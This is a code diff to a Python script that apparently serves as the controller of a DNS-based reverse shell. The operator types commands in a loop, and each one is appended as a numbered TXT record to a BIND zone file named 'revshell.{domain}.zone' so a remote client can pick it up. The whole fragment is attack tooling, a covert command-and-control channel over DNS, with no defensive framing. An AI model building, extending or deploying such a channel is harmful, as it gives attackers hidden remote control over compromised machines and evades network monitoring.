@@ -73,18 +73,7 @@ def getData():
 print("Enter code:")
 code = input()
 
-filename = f"../bind/zones/{code}.{domain}.zone"
-zone = open(filename, "w")
-# write the zonefile
-zone.write("""$TTL 1h
-@       IN      SOA     ns.{domain}. hostmaster.{domain}. (
-                        1111111111      ; serial number YYMMDDNN
-                        1h              ; refresh
-                        10m             ; retry
-                        1w              ; expiry
-                        1h )            ; minimum)
-""".format(domain=domain))
-zone.close()
+filename = f"../bind/zones/revshell.{domain}.zone"
 
 command = ""
 while(command != "exit"):
@@ -93,6 +82,7 @@ while(command != "exit"):
     command = input()
     
     # send command to client
-    zone = open(filename, "w")
-    zone.write(f"""{counter}       IN      TXT      {command}""")
+    zone = open(filename, "a")
+    zone.write(f"""{counter}.{code}       IN      TXT      {command}\n""")
     zone.close()
+    counter += 1
